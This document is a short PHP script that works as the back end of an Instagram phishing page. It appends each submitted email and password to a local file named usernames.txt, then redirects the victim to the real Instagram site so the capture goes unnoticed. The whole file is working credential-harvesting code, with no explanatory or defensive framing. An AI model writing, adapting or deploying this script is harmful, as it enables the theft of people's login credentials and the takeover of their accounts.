<?php
file_put_contents("usernames.txt", "Instagram Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://instagram.com/');
exit();
?>
